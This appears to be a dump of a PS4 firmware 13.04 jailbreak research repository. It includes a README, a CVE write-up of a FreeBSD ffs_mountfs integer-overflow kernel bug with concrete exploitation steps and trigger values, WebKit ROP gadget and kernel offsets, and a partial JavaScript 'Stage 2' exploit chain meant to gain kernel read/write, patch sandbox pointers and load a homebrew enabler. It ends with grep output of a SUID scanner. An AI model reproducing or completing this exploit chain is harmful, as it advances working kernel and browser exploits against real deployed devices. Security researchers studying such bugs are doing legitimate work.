@@ -1,0 +1,412 @@
+## README Celsius and setup
+1:# PS4 Security Research — Firmware 13.04
+2-
+3:Research tools and kernel offsets for PS4 firmware 13.04 security research.
+4-
+5-## Contents
+6-
+7:- `1304.c` / `1304.h` — Complete kernel offsets for FW 13.04
+8:- `1352_offsets.txt` — Partial kernel offsets for FW 13.52
+9:- `src/org/bdj/SuidScanner.java` — SUID/SGID binary scanner via BD-JB
+10-- `scanner_1304.iso` — Pre-built ISO for testing
+11-- `cve_analysis.md` — CVE analysis for PS4 kernel
+12-
+13-## Status (July 21, 2026)
+14-
+15:### Entry Points Confirmed on 13.04
+16:- ✅ **BD-JB** — Sandbox escape working (ps3120/Gezine)
+17-- ✅ **WebKit DOM postMessage** — Vulnerability present (confirmed on hardware)
+18-- ✅ **WebKit DOM getters** — Vulnerability present (confirmed on hardware)
+19-- ✅ **WebKit LLInt OOB** — Vulnerability present (confirmed on hardware)
+20:- ✅ **PlayStation Vue** — Installed, potential Celsius entry point
+21-
+22-### Kernel Exploits
+23:- 🔥 **Celsius (ffs_mount)** — Integer overflow in ffs_mountfs(), works up to 13.04, patched in 13.50. Discovered by bollars.
+24-- 🔥 **CVE-2026-49415** — execve TOCTOU race condition, affects all FreeBSD versions. Under investigation.
+25-
+26-### Latest News
+27:- **2026-07-21**: MasterMaind confirms BD-J sandbox escape up to 13.50/13.52
+28-- **2026-07-21**: etaHEN updated for PS5 up to 12.70
+29:- **2026-07-18**: Celsius (ffs_mount KEX) announced by bollars
+30:- **2026-07-18**: 13.04 kernel offsets published
+31-
+32-## SUID Scanner
+33-
+34:Scans the PS4 filesystem for SUID/SGID binaries via BD-JB userland exploit.
+35:Uses native FreeBSD syscalls (open, getdents, stat) via BD-JB's Java API.
+36-Results displayed on screen and saved to USB at `/mnt/usb0/suid_scan.txt`.
+37-
+38-### Usage
+39-1. Burn `scanner_1304.iso` to BD-R at 4x speed
+40-2. Insert USB drive (FAT32/exFAT) in PS4
+41-3. Insert BD-R disc
+42-4. Results appear on screen and saved to USB
+43-
+44:## Kernel Offsets
+45-
+46:### 13.04 (Complete)
+47:Full offsets in `1304.c` — based on 13.02 (identical kernel) verified by Pharaoh2k's offset table.
+48-
+49-### 13.52 (Partial)
+50-```
+51-PRISON0    = 0x111FA18
+52-ROOTVNODE  = 0x2136E90
+--
+58-## CVE Analysis
+59-
+60-See `cve_analysis.md` for detailed analysis of:
+61-- **CVE-2026-7270** — execve buffer overflow (DISCARDED: function not present in FreeBSD 9)
+62-- **CVE-2026-49415** — execve TOCTOU race (CANDIDATE: SUID code confirmed in FreeBSD 9)
+63:- **Celsius / ffs_mount** — Integer overflow in ffs_mountfs() (CONFIRMED for 13.04)
+64-
+65:## Celsius (ffs_mount) Technical Analysis
+66-
+67:The vulnerability is in `ffs_mountfs()` in `sys/ufs/ffs/ffs_vfsops.c`:
+68-
+69-```c
+70-size = fs->fs_cssize;                          // attacker controlled
+71-if (fs->fs_contigsumsize > 0)
+72-    size += fs->fs_ncg * sizeof(int32_t);      // INTEGER OVERFLOW
+73-size += fs->fs_ncg * sizeof(u_int8_t);         // INTEGER OVERFLOW
+74:space = malloc((u_long)size, M_UFSMNT, M_WAITOK);  // small malloc
+75-
+76-// Later:
+77-for (i = 0; i < fs->fs_ncg; i++)               // huge loop
+78-    *lp++ = fs->fs_contigsumsize;               // HEAP OVERFLOW
+79-```
+80-
+81:`fs->fs_ncg` comes from the UFS superblock (attacker controlled). A large value causes integer overflow in the size calculation, resulting in a small malloc but massive heap overflow.
+82-
+83:**Requirements:** BD-J or Vue entry point + 250GB+ HDD with malformed UFS image.
+84-
+85-## MP4 Parser Vulnerability (Under Investigation)
+86-
+87-A malformed MP4 file (`mutado_race.mp4`) crashes Media Player and SHAREfactory:
+88:- Crash confirmed on FW 11.00 (likely present on 13.04)
+89-- Bug in `moov.udta.meta` atom parsing
+90-- Child atom declares 190 bytes in 90-byte container → heap overflow
+91:- Injection points at offsets 0x833 and 0x885
+92-- Error 34878-0 on SHAREfactory, freeze on Media Player
+93-
+94-Credit: Shunsui (discovery and analysis)
+95-
+96-## Based on
+97:- [BD-JB-1250](https://github.com/ps3120/BD-JB-1250) by ps3120/Gezine
+98:- [Scene-Collective/ps4-hen](https://github.com/Scene-Collective/ps4-hen) for offset format
+99-- [PPPwn](https://github.com/TheOfficialFloW/PPPwn) by TheFloW for exploit architecture reference
+100-
+101-## Credits
+102:- ps3120 — BD-JB-1250 and bdj1304.iso
+103:- Gezine — BD-JB vulnerability discovery
+104:- Scene-Collective — ps4-hen open source offsets
+105:- Pharaoh2k — 13.04 kernel offsets verification
+106:- bollars — Celsius (ffs_mount) discovery
+107:- MasterMaind (@ASaudidos) — BD-J escape confirmation up to 13.52
+108-- Shunsui — MP4 parser vulnerability discovery and analysis
+109:- Victor — Celsius confirmation and technical guidance
+110-
+111-## License
+112-This research is for educational and security research purposes only.
+## cve analysis
+21-- **Key code path:**
+22-  1. VOP_GETATTR reads file attributes (SUID bit)
+23-  2. credential_changing checks S_ISUID/S_ISGID
+24-  3. setsugid() marks process
+25-  4. PROC_UNLOCK → VOP_UNLOCK → window of vulnerability
+26-  5. setugidsafety() closes insecure fds
+27:- **Challenge:** PS4 may not have accessible SUID binaries from BD-J sandbox
+28-
+29:## Celsius / ffs_mount — Integer Overflow 🔥 CONFIRMED
+30-
+31-- **Type:** Kernel heap overflow
+32:- **Component:** ffs_mountfs() in sys/ufs/ffs/ffs_vfsops.c
+33-- **Discovered by:** bollars (via kernel diffing)
+34-- **Works on:** PS4 up to 13.04, PS5 up to 12.70
+35-- **Patched in:** PS4 13.50, PS5 13.00
+36-- **Status:** CONFIRMED — vulnerable code present in FreeBSD 9
+37-
+38-### Vulnerable code:
+39-```c
+40-// Line ~910 in ffs_vfsops.c
+41:size = fs->fs_cssize;                          // from superblock (attacker controlled)
+42-blks = howmany(size, fs->fs_fsize);
+43:if (fs->fs_contigsumsize > 0)
+44:    size += fs->fs_ncg * sizeof(int32_t);      // INTEGER OVERFLOW HERE
+45:size += fs->fs_ncg * sizeof(u_int8_t);
+46:space = malloc((u_long)size, M_UFSMNT, M_WAITOK);  // allocates SMALL buffer
+47-
+48-// Later in the same function:
+49:if (fs->fs_contigsumsize > 0) {
+50-    fs->fs_maxcluster = lp = space;
+51:    for (i = 0; i < fs->fs_ncg; i++)           // iterates fs_ncg times
+52:        *lp++ = fs->fs_contigsumsize;           // HEAP OVERFLOW
+53-    space = lp;
+54-}
+55-```
+56-
+57-### Exploitation:
+58:1. Craft UFS image with malicious superblock (fs_ncg = 0x40000001)
+59:2. Mount via BD-J or Vue entry point
+60-3. Integer overflow causes small malloc + massive heap write
+61-4. Heap grooming needed to control what gets overwritten
+62-5. Convert heap overflow to kernel read/write
+63-6. Patch kernel, load payload
+64-
+65-### Requirements:
+66:- BD-J or Vue userland entry point
+67:- 250GB+ HDD with malformed UFS image (per Victor's guidance)
+68-- Kernel offsets for target firmware
+69-
+70-### Superblock structure (key fields):
+71-```
+72-Offset in struct fs:
+73:  fs_ncg           (u_int32_t) — controls the overflow
+74-  fs_bsize         (int32_t)   — must pass validation checks
+75-  fs_fsize         (int32_t)   — must pass validation checks
+76:  fs_cssize        (int32_t)   — initial size value
+77:  fs_contigsumsize (int32_t)   — must be > 0 to trigger vulnerable path
+78-```
+79-
+80-## MP4 Parser Vulnerability ⚠️ UNDER INVESTIGATION
+81-
+82-- **Type:** Heap buffer overflow in multimedia parser
+83-- **Component:** MP4/M4A atom parser (likely libSceAvPlayer)
+## stage2 symbols and comments
+1-// ============================================================
+2:// Jordy Stage 2 - Persistent R/W + Code Execution for PS4 13.04
+3-// 
+4-// INSTRUCTIONS:
+5-// 1. Replace the "// Restore the carrier" block in Jordy (lines 500-507)
+6-//    with a call to stage2_init()
+7-// 2. This keeps the candidate alive and exposes read/write primitives
+8:// 3. Then builds and executes ROP chain for kernel access
+9-// ============================================================
+10-
+11-// Global state from Jordy
+12-var g_candidate = null;       // The SSV candidate that controls m_vector
+13-var g_rwView = null;          // The genuine Uint8Array we redirect
+14-var g_rwHeader = null;        // Original header backup
+15-var g_scratchBytes = null;    // Scratch buffer for pointer encoding
+16-var g_scratchWords = null;
+17:var g_webkit_base = 0;
+18:var g_libkernel_base = 0;
+19-
+20:// WebKit 13.04 ROP Gadgets
+21-var G = {
+22-    POP_RDI_RET:     0x060480,
+23-    POP_RSI_RET:     0x07245e,
+24-    POP_RDX_RET:     0x1305ba,
+25-    POP_RAX_RET:     0x014504,
+--
+31-    LEAVE_RET:       0x01c2f7,
+32-    RET:             0x004032,
+33-    JMP_RSI:         0x0cda83,
+34-};
+35-
+36:// Kernel 13.04 offsets
+37-var K = {
+38-    PRISON0:         0x0111FA18,
+39-    ROOTVNODE:       0x02136E90,
+40-    ALLPROC:         0x01B28538,
+41-    SYSENT:          0x01102B70,
+--
+47-    if (el) el.textContent += msg + "\n";
+48-    console.log(msg);
+49-}
+50-
+51-// ============================================================
+52:// STEP 0: Initialize persistent R/W
+53-// Call this INSTEAD of Jordy's restoration block
+54-// ============================================================
+55-function stage2_init(candidate, rwView, rwHeader, scratchBytes, scratchWords) {
+56-    g_candidate = candidate;
+57-    g_rwView = rwView;
+58-    g_rwHeader = rwHeader;
+59-    g_scratchBytes = scratchBytes;
+60-    g_scratchWords = scratchWords;
+61-    
+62:    log("[S2] Stage 2 initialized - persistent r/w active");
+63-    
+64-    // Start the exploitation chain
+65-    try {
+66-        stage2_run();
+67-    } catch(e) {
+--
+150-    g_rwView[6] = (hi >> 16) & 0xFF;
+151-    g_rwView[7] = (hi >> 24) & 0xFF;
+152-}
+153-
+154-// ============================================================
+155:// STEP 2: Find WebKit base via vtable leak
+156-// ============================================================
+157:function findWebkitBase() {
+158-    // The rwView's StructureID tells us the VM state
+159-    // We need to read a known vtable pointer
+160-    
+161-    // Strategy: Read from a known object's memory
+162-    // The targetView (Uint8Array) has a vtable at its first qword
+163:    // We know targetAddress from Jordy's addrof
+164-    
+165-    // Read targetView's vtable (first 8 bytes of the cell)
+166:    var vtable = read64(targetAddress);
+167-    log("[S2] targetView vtable: 0x" + vtable.toString(16));
+168-    
+169:    // Uint8Array vtable offset in WebKit 13.04 needs to be determined
+170-    // For now, try common pattern: vtable is in the data segment
+171:    // webkit_base = vtable - known_vtable_offset
+172-    
+173-    // The Uint8Array StructureID was validated by Jordy:
+174-    // SID >= 0x4000 and aligned to 0x10
+175:    // The vtable for JSC::JSUint8Array is at a known offset
+176-    
+177:    // TODO: Determine JSUint8Array vtable offset for 13.04
+178-    // For now, estimate: vtable is likely near 0x3cc0000-0x3d00000 range
+179:    // webkit_base = vtable - vtable_offset
+180-    
+181-    return 0; // placeholder
+182-}
+183-
+184-// ============================================================
+185:// STEP 3: Find libkernel base
+186-// ============================================================
+187:function findLibkernelBase() {
+188:    // Read WebKit's GOT to find imported libkernel functions
+189:    // pthread_create is imported from libkernel
+190:    // GOT entry for pthread_create at webkit_base + 0x3ce1000 (approx)
+191-    
+192:    // TODO: Find exact GOT offset
+193-    return 0; // placeholder
+194-}
+195-
+196-// ============================================================
+197-// STEP 4: Build ROP chain
+198-// ============================================================
+199-function buildRopChain() {
+200:    var wk = g_webkit_base;
+201-    var chain = [];
+202-    var i = 0;
+203-    
+204:    function p(gadget_offset) {
+205:        chain[i++] = wk + gadget_offset;
+206-    }
+207-    function v(value) {
+208-        chain[i++] = value;
+209-    }
+210-    
+211:    // === Resolve dlsym ===
+212:    // pop rdi, ret; LIBKERNEL_HANDLE
+213-    p(G.POP_RDI_RET); v(0x2001);
+214:    // pop rsi, ret; "sceKernelDlsym" string addr
+215-    p(G.POP_RSI_RET); v(0); // TODO: string address
+216:    // call dlsym
+217:    // TODO: dlsym address
+218-    
+219:    // === After dlsym resolves mount: ===
+220:    // pop rdi, ret; "ufs" string
+221:    // pop rsi, ret; mount point
+222-    // pop rdx, ret; flags
+223:    // pop rcx, ret; data (malformed UFS image)
+224:    // call mount → triggers ffs_mountfs → Celsius
+225-    
+226:    // === After kernel r/w via Celsius: ===
+227-    // Patch PRISON0
+228-    // Patch ROOTVNODE  
+229-    // Enable debug settings
+230-    // Open BinLoader port 9021
+231-    // Load GoldHEN
+--
+238-// ============================================================
+239-function executeRop(chain) {
+240-    // Write ROP chain to a known writable address
+241-    // Then redirect execution to it
+242-    
+243:    // Strategy: Find a JIT page in the WebKit process
+244-    // Write the chain there
+245-    // Overwrite a callback to point to chain start
+246-    
+247-    log("[S2] ROP chain: " + chain.length + " entries");
+248:    log("[S2] TODO: Implement execution pivot");
+249-}
+250-
+251-// ============================================================
+252-// Main
+253-// ============================================================
+254-function stage2_run() {
+255-    log("[S2] ====== STAGE 2 START ======");
+256-    
+257:    g_webkit_base = findWebkitBase();
+258:    if (g_webkit_base === 0) {
+259:        log("[S2] Could not determine webkit_base - need vtable offset");
+260:        log("[S2] Dumping first 64 bytes at targetAddress for analysis...");
+261-        var dump = "";
+262-        for (var i = 0; i < 64; i++) {
+263:            var b = read8(targetAddress + i);
+264-            dump += (b < 16 ? "0" : "") + b.toString(16);
+265-            if (i % 16 === 15) dump += "\n";
+266-        }
+267-        log(dump);
+268-        stage2_restore();
+269-        return;
+270-    }
+271-    
+272:    log("[S2] webkit_base = 0x" + g_webkit_base.toString(16));
+273-    
+274:    g_libkernel_base = findLibkernelBase();
+275:    log("[S2] libkernel_base = 0x" + g_libkernel_base.toString(16));
+276-    
+277-    var chain = buildRopChain();
+278-    executeRop(chain);
+279-    
+280-    log("[S2] ====== STAGE 2 COMPLETE ======");
+## BD-J scanner calls
+[35mv2.0:README.md[m[36m:[m[32m1[m[36m:[m# PS4 Security Research — Firmware [1;31m13.04[m
+[35mv2.0:README.md[m[36m:[m[32m3[m[36m:[mResearch tools and kernel offsets for PS4 firmware [1;31m13.04[m security research.
+[35mv2.0:README.md[m[36m:[m[32m7[m[36m:[m- `1304.c` / `1304.h` — Complete kernel offsets for FW [1;31m13.04[m
+[35mv2.0:README.md[m[36m:[m[32m9[m[36m:[m- `src/org/bdj/Suid[1;31mScanner[m.java` — SUID/SGID binary [1;31mscanner[m via [1;31mBD-J[mB
+[35mv2.0:README.md[m[36m:[m[32m10[m[36m:[m- `[1;31mscanner[m_1304.iso` — Pre-built ISO for testing
+[35mv2.0:README.md[m[36m:[m[32m15[m[36m:[m### Entry Points Confirmed on [1;31m13.04[m
+[35mv2.0:README.md[m[36m:[m[32m16[m[36m:[m- ✅ **[1;31mBD-J[mB** — Sandbox escape working (ps3120/Gezine)
+[35mv2.0:README.md[m[36m:[m[32m23[m[36m:[m- 🔥 **Celsius (ffs_[1;31mmount[m)** — Integer overflow in ffs_[1;31mmount[mfs(), works up to [1;31m13.04[m, patched in 13.50. Discovered by bollars.
+[35mv2.0:README.md[m[36m:[m[32m27[m[36m:[m- **2026-07-21**: MasterMaind confirms [1;31mBD-J[m sandbox escape up to 13.50/13.52
+[35mv2.0:README.md[m[36m:[m[32m29[m[36m:[m- **2026-07-18**: Celsius (ffs_[1;31mmount[m KEX) announced by bollars
+[35mv2.0:README.md[m[36m:[m[32m30[m[36m:[m- **2026-07-18**: [1;31m13.04[m kernel offsets published
+[35mv2.0:README.md[m[36m:[m[32m32[m[36m:[m## SUID [1;31mScanner[m
+[35mv2.0:README.md[m[36m:[m[32m34[m[36m:[mScans the PS4 filesystem for SUID/SGID binaries via [1;31mBD-J[mB userland exploit.
+[35mv2.0:README.md[m[36m:[m[32m35[m[36m:[mUses native FreeBSD syscalls ([1;31mopen[m, getdents, stat) via [1;31mBD-J[mB's Java API.
+[35mv2.0:README.md[m[36m:[m[32m39[m[36m:[m1. Burn `[1;31mscanner[m_1304.iso` to BD-R at 4x speed
+[35mv2.0:README.md[m[36m:[m[32m46[m[36m:[m### [1;31m13.04[m (Complete)
+[35mv2.0:README.md[m[36m:[m[32m63[m[36m:[m- **Celsius / ffs_[1;31mmount[m** — Integer overflow in ffs_[1;31mmount[mfs() (CONFIRMED for [1;31m13.04[m)
+[35mv2.0:README.md[m[36m:[m[32m65[m[36m:[m## Celsius (ffs_[1;31mmount[m) Technical Analysis
+[35mv2.0:README.md[m[36m:[m[32m67[m[36m:[mThe vulnerability is in `ffs_[1;31mmount[mfs()` in `sys/ufs/ffs/ffs_vfsops.c`:
+[35mv2.0:README.md[m[36m:[m[32m83[m[36m:[m**Requirements:** [1;31mBD-J[m or Vue entry point + 250GB+ HDD with malformed UFS image.
+[35mv2.0:README.md[m[36m:[m[32m88[m[36m:[m- Crash confirmed on FW 11.00 (likely present on [1;31m13.04[m)
+[35mv2.0:README.md[m[36m:[m[32m97[m[36m:[m- [[1;31mBD-J[mB-1250](https://github.com/ps3120/[1;31mBD-J[mB-1250) by ps3120/Gezine
+[35mv2.0:README.md[m[36m:[m[32m102[m[36m:[m- ps3120 — [1;31mBD-J[mB-1250 and bdj1304.iso
+[35mv2.0:README.md[m[36m:[m[32m103[m[36m:[m- Gezine — [1;31mBD-J[mB vulnerability discovery
+[35mv2.0:README.md[m[36m:[m[32m104[m[36m:[m- Scene-Collective — ps4-hen [1;31mopen[m source offsets
+[35mv2.0:README.md[m[36m:[m[32m105[m[36m:[m- Pharaoh2k — [1;31m13.04[m kernel offsets verification
+[35mv2.0:README.md[m[36m:[m[32m106[m[36m:[m- bollars — Celsius (ffs_[1;31mmount[m) discovery
+[35mv2.0:README.md[m[36m:[m[32m107[m[36m:[m- MasterMaind (@ASaudidos) — [1;31mBD-J[m escape confirmation up to 13.52
+[35mv2.0:cve_analysis.md[m[36m:[m[32m18[m[36m:[m- **Patched:** June 30, 2026 (after PS4 [1;31m13.04[m release)
+[35mv2.0:cve_analysis.md[m[36m:[m[32m27[m[36m:[m- **Challenge:** PS4 may not have accessible SUID binaries from [1;31mBD-J[m sandbox
+[35mv2.0:cve_analysis.md[m[36m:[m[32m29[m[36m:[m## Celsius / ffs_[1;31mmount[m — Integer Overflow 🔥 CONFIRMED
+[35mv2.0:cve_analysis.md[m[36m:[m[32m32[m[36m:[m- **Component:** ffs_[1;31mmount[mfs() in sys/ufs/ffs/ffs_vfsops.c
+[35mv2.0:cve_analysis.md[m[36m:[m[32m34[m[36m:[m- **Works on:** PS4 up to [1;31m13.04[m, PS5 up to 12.70
+[35mv2.0:cve_analysis.md[m[36m:[m[32m59[m[36m:[m2. [1;31mMount[m via [1;31mBD-J[m or Vue entry point
+[35mv2.0:cve_analysis.md[m[36m:[m[32m66[m[36m:[m- [1;31mBD-J[m or Vue userland entry point
+[35mv2.0:cve_analysis.md[m[36m:[m[32m86[m[36m:[m- **Likely affected:** All PS4 firmwares including [1;31m13.04[m and 13.52
+[35mv2.0:src/org/bdj/SuidScanner.java[m[36m:[m[32m5[m[36m:[mpublic class Suid[1;31mScanner[m {
+[35mv2.0:src/org/bdj/SuidScanner.java[m[36m:[m[32m20[m[36m:[m    private long [1;31mopen[mAddr, closeAddr, getdentsAddr, statAddr, writeAddr;
+[35mv2.0:src/org/bdj/SuidScanner.java[m[36m:[m[32m24[m[36m:[m    public Suid[1;31mScanner[m() {
+[35mv2.0:src/org/bdj/SuidScanner.java[m[36m:[m[32m29[m[36m:[m            [1;31mopen[mAddr = api.[1;31mdlsym[m(API.LIBC_MODULE_HANDLE, "[1;31mopen[m");
+[35mv2.0:src/org/bdj/SuidScanner.java[m[36m:[m[32m30[m[36m:[m            closeAddr = api.[1;31mdlsym[m(API.LIBC_MODULE_HANDLE, "close");
+[35mv2.0:src/org/bdj/SuidScanner.java[m[36m:[m[32m31[m[36m:[m            getdentsAddr = api.[1;31mdlsym[m(API.LIBC_MODULE_HANDLE, "getdents");
+[35mv2.0:src/org/bdj/SuidScanner.java[m[36m:[m[32m32[m[36m:[m            statAddr = api.[1;31mdlsym[m(API.LIBC_MODULE_HANDLE, "stat");
+[35mv2.0:src/org/bdj/SuidScanner.java[m[36m:[m[32m33[m[36m:[m            writeAddr = api.[1;31mdlsym[m(API.LIBC_MODULE_HANDLE, "write");
+[35mv2.0:src/org/bdj/SuidScanner.java[m[36m:[m[32m34[m[36m:[m            Status.println("[1;31mopen[m=" + Long.toHexString([1;31mopen[mAddr) +
+[35mv2.0:src/org/bdj/SuidScanner.java[m[36m:[m[32m38[m[36m:[m            Status.printStackTrace("Suid[1;31mScanner[m init: ", e);
+[35mv2.0:src/org/bdj/SuidScanner.java[m[36m:[m[32m48[m[36m:[m        Status.println("=== SUID [1;31mScanner[m PS4 [1;31m13.04[m ===");
+[35mv2.0:src/org/bdj/SuidScanner.java[m[36m:[m[32m57[m[36m:[m        if (depth > 3 || [1;31mopen[mAddr == 0) return;
+[35mv2.0:src/org/bdj/SuidScanner.java[m[36m:[m[32m61[m[36m:[m        long fd = api.call([1;31mopen[mAddr, pathBuf, O_RDONLY);
+[35mv2.0:src/org/bdj/SuidScanner.java[m[36m:[m[32m124[m[36m:[m            long fd = api.call([1;31mopen[mAddr, p, O_WRONLY | O_CREAT | O_TRUNC, 0x1A4);
+[35mv2.0:src/org/bdj/SuidScanner.java[m[36m:[m[32m126[m[36m:[m                String data = "PS4 [1;31m13.04[m SUID Scan\nFound: " + suidCount + "\n\n" + results.toString();
